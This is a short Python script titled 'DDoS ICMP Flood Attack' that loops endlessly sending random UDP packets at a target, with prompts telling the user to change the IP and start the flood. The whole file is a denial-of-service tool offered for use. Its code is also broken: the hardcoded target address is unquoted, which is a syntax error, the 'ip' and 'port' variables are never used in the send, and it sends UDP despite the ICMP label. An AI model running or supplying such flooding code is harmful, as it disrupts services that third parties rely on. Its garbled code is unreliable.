import sys
import os
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print('DDoS ICMP Flood Attack')
print('Change IP in script')
print()
input('Hit enter to start, Ctrl+C to exit')

# change ip here
ip = "8.8.8.8"
port = 1000
sent = 0


while True:
     sock.sendto(bytes, (185.213.209.155,80))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
